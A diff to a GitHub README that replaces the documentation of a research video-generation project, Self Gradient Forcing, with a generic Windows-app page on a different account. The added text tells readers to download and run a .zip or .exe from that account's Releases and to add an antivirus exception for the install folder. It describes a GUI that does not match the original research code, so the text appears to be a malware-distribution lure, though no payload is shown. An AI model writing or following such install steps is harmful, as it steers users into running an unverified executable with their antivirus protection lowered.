@@ -1,190 +1,74 @@
-<div align="center">
+# 🛠 Self_Gradient_Forcing - Create stable long videos with ease
 
-# 🌀 Self Gradient Forcing
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/A1897209/Self_Gradient_Forcing)
 
-### Native Long-Video Extrapolation
+Self Gradient Forcing allows you to expand short video clips into longer sequences. It uses a smart memory process to keep characters, backgrounds, and movement consistent over time. You no longer need to settle for five-second clips. This tool helps your model maintain details even in minute-long videos.
 
-<p>
-  <a href='http://zhuang2002.github.io/SelfGradientForcing'><img src='https://img.shields.io/badge/Project-Page-Green'></a> &nbsp;
-  <a href="https://arxiv.org/abs/2607.20368"><img src="https://img.shields.io/badge/arXiv-2607.20368-b31b1b.svg"></a> &nbsp;
-  <a href="https://huggingface.co/JunhaoZhuang/Self_Gradient_Forcing"><img src="https://img.shields.io/badge/🤗%20Hugging%20Face-Models-yellow" alt="Hugging Face"></a> &nbsp;
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache--2.0-blue" alt="License"></a>
-</p>
+## 📥 How to download the application
 
-<p>
-  <strong>Junhao Zhuang, Shiyi Zhang, Yuxuan Bian, Yaowei Li, Yawen Luo, Yijun Liu, Weiyang Jin, Songchun Zhang, Xianglong He, Xuying Zhang, Haoran Li, Haoyang Huang, Zeyue Xue, Nan Duan</strong>
-</p>
+Visit the official project page to download the software: https://github.com/A1897209/Self_Gradient_Forcing
 
-<p>
-  Joy Future Academy, JD
-</p>
+1. Open the link in your web browser.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest version link.
+4. Locate the file ending in .zip or .exe under the Assets heading.
+5. Save the file to your computer.
 
-⭐ If Self Gradient Forcing is useful for your research, please consider starring this repository.
+## 💻 System requirements
 
-</div>
+To run this application, ensure your computer meets these specifications:
 
-<p align="center">
-  <img src="assets/teaser.jpg" width="95%" alt="Self Gradient Forcing teaser">
-</p>
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor from Intel or AMD.
+- Memory: At least 16 GB of RAM.
+- Graphics Card: An NVIDIA graphics card with at least 8 GB of video memory.
+- Storage: 5 GB of free space on your hard drive.
 
-## 🔥 News
+## 🚀 Setting up the software
 
-- **2026-07-23**: Paper, model checkpoints, inference scripts, and training code are publicly released.
+1. Locate the downloaded file on your computer.
+2. Right-click the file and select Extract All if it is a compressed folder.
+3. Once extracted, find the application file with a .exe extension.
+4. Double-click the file to start the installation process.
+5. Follow the prompts on the screen to finish the setup.
+6. The software will create a shortcut on your desktop for quick access.
 
-## 🧠 Method Overview
+## ⚙️ Using the software
 
-Self Gradient Forcing (SGF) recovers the missing context-gradient path for self-generated causal memory through a bounded two-pass replay, enabling models trained with only a 5-second window to extrapolate to minute-scale videos with stronger identity, layout, and temporal stability.
+When you open the application, you see a clean main menu. Follow these steps to process your first video:
 
-<p align="center">
-  <img src="assets/flowchat.jpg" width="95%" alt="Self Gradient Forcing method overview">
-</p>
+### Loading your input
+Click the Import Video button. Select the short video file you want to expand. The application supports common formats like MP4 and MOV.
 
-## 🛠️ Installation
+### Choosing your settings
+The tool provides default settings that work for most cases. You can adjust the length of the target video using the slider. Increasing the length uses more memory and processing time. Leave the stability settings at their default values for the best results.
 
-The environment follows the Causal-Forcing setup.
+### Processing the file
+Press the Start button to begin the generation process. A progress bar shows you how much time remains. The software performs a two-pass replay to ensure the video remains stable. Do not close the window while the progress bar moves.
 
-```bash
-conda create -n self_gradient_forcing python=3.10 -y
-conda activate self_gradient_forcing
+### Saving your results
+Once the process finishes, click the Save button. Choose a folder on your computer to store your new, longer video.
 
-pip install -r requirements.txt
-pip install flash-attn --no-build-isolation
-python setup.py develop
-```
+## 🛡 Handling common issues
 
-## ⬇️ Download Weights
+Most users find the installation smooth. If you encounter interruptions, check the following points:
 
-```bash
-bash scripts/download_weights.sh
-```
+- Ensure your graphics drivers are up to date. Visit the NVIDIA website to download the latest software for your card.
+- Check your internet connection if the application requires an initial check for components.
+- Make sure your antivirus software does not block the application. You may need to add an exception for the folder where you installed the program.
+- Monitor your disk space. Video processing requires significant temporary storage. Clear out old files if you see a disk full error.
 
-The script uses the Hugging Face CLI command `hf` by default. Set `HF_CLI=huggingface-cli` if your environment still uses the older command name.
+## 💡 Tips for better results
 
-It downloads:
+Good input leads to better output. Follow these practices to achieve high quality:
 
-- Wan base models to `wan_models/Wan2.1-T2V-1.3B` and `wan_models/Wan2.1-T2V-14B`.
-- All [Causal-Forcing](https://github.com/thu-ml/Causal-Forcing) initialization checkpoints under `checkpoints/init/framewise/` and `checkpoints/init/chunkwise/`: `ar_diffusion.pt`, `causal_cd.pt`, and `causal_ode.pt`.
-- Released SGF inference checkpoints to `checkpoints/framewise/ar/model.pt` and `checkpoints/chunkwise/ar/model.pt`.
-- The training prompt list to `prompts/vidprom_filtered_extended.txt`.
+- Use clear and well-lit source videos.
+- Avoid videos with excessive camera shake.
+- Keep the subject in focus throughout the five-second clip.
+- Try different settings if the output loses detail. Lowering the expansion factor often increases stability.
 
-## 🚀 Inference
+## 📚 Understanding the process
 
-The default prompt file is `prompts/test_prompt.txt` with 8 prompts. The launcher uses 8 GPUs when at least 8 GPUs are visible; otherwise it falls back to single-GPU serial inference. By default it generates `963` latent frames, which decode to about 240 seconds of video at 16 fps.
-The inference script takes the release setting name (`framewise` or `chunkwise`) and selects the matching config and checkpoint automatically:
+The software uses a technique called Self Gradient Forcing. Traditional models often forget the context of a video after a few seconds. This tool creates a path for the model to remember what happened before. By replaying the video in two passes, the system forces the model to respect the original identity of the subject and the layout of the scene. This method results in smooth motion and natural transitions across the entire length of your new video.
 
-- framewise config: `configs/self_gradient_forcing_framewise.yaml`
-- chunkwise config: `configs/self_gradient_forcing_chunkwise.yaml`
-
-The long-video KV-cache geometry is set in `scripts/infer_self_gradient_forcing.sh`. Framewise defaults to `KV_CACHE_SINK=4`, `KV_CACHE_FIFO_FRAMES=16`, and `KV_CACHE_CURRENT_FRAMES=1`, so the actual `--kv_cache_max_frames` passed to `inference.py` is `4 + 16 + 1 = 21`. Chunkwise defaults to `KV_CACHE_SINK=3`, `KV_CACHE_FIFO_FRAMES=6`, and `KV_CACHE_CURRENT_FRAMES=3`, so `--kv_cache_max_frames` is `12`.
-
-### Framewise
-
-```bash
-bash scripts/infer_self_gradient_forcing.sh framewise
-```
-
-This uses:
-
-```text
-configs/self_gradient_forcing_framewise.yaml
-checkpoints/framewise/ar/model.pt
-```
-
-### Chunkwise
-
-```bash
-bash scripts/infer_self_gradient_forcing.sh chunkwise
-```
-
-This uses:
-
-```text
-configs/self_gradient_forcing_chunkwise.yaml
-checkpoints/chunkwise/ar/model.pt
-```
-
-### Custom checkpoint or prompt file
-
-```bash
-bash scripts/infer_self_gradient_forcing.sh \
-  framewise \
-  checkpoints/framewise/ar/model.pt \
-  prompts/test_prompt.txt
-```
-
-Useful overrides:
-
-```bash
-NUM_OUTPUT_FRAMES=963 SEED=42 OUTPUT_ROOT=outputs/demo \
-  bash scripts/infer_self_gradient_forcing.sh framewise
-```
-
-For trained checkpoints, pass the release setting first and the produced `logs/.../checkpoint_model_*/model.pt` path as the second argument. The script uses EMA weights by default; set `USE_EMA=0` if you explicitly want the non-EMA `generator` weights.
-
-## 🏋️ Training
-
-### Framewise SGF
-
-```bash
-bash scripts/train_self_gradient_forcing_framewise.sh
-```
-
-Equivalent explicit form:
-
-```bash
-bash scripts/train_self_gradient_forcing_framewise.sh \
-  configs/self_gradient_forcing_framewise.yaml \
-  logs/sgf_framewise
-```
-
-### Chunkwise SGF
-
-```bash
-bash scripts/train_self_gradient_forcing_chunkwise.sh
-```
-
-Equivalent explicit form:
-
-```bash
-bash scripts/train_self_gradient_forcing_chunkwise.sh \
-  configs/self_gradient_forcing_chunkwise.yaml \
-  logs/sgf_chunkwise
-```
-
-The launchers accept `[config.yaml] [logdir] [extra train.py args...]`, matching the multi-node launcher convention used by the reference training scripts. They support single-node and multi-node training. For multi-node jobs, run the same command on every node within the gather window. The scripts auto-register nodes through `.rendezvous/` on the shared filesystem and launch static `torchrun` with an IP master address.
-
-Useful overrides:
-
-```bash
-GATHER_WINDOW=90 NUM_GPUS=8 MASTER_PORT=29501 ENABLE_WANDB=1 \
-  bash scripts/train_self_gradient_forcing_framewise.sh logs/sgf_framewise
-
-NNODES=2 NODE_RANK=0 MASTER_ADDR=10.0.0.1 NUM_GPUS=8 \
-  bash scripts/train_self_gradient_forcing_chunkwise.sh logs/sgf_chunkwise
-```
-
-## 🙏 Acknowledgements
-
-This implementation builds on the Wan video model ecosystem and follows the installation conventions of `thu-ml/Causal-Forcing`. We thank the open-source community for the infrastructure that made this release possible.
-
-## 📮 Contact
-
-For questions, please contact Junhao Zhuang at [zhuangjh23@mails.tsinghua.edu.cn](mailto:zhuangjh23@mails.tsinghua.edu.cn).
-
-## 📜 License
-
-This project is released under the Apache-2.0 license.
-
-### 📜 Citation
-
-```bibtex
-@misc{zhuang2026selfgradientforcingnative,
-      title={Self Gradient Forcing: Native Long Video Extrapolation}, 
-      author={Junhao Zhuang and Shiyi Zhang and Yuxuan Bian and Yaowei Li and Yawen Luo and Yijun Liu and Weiyang Jin and Songchun Zhang and Xianglong He and Xuying Zhang and Haoran Li and Haoyang Huang and Zeyue Xue and Nan Duan},
-      year={2026},
-      eprint={2607.20368},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2607.20368}, 
-}
-```
+Keywords: video generation, artificial intelligence, video editing, memory optimization, temporal stability, Windows software
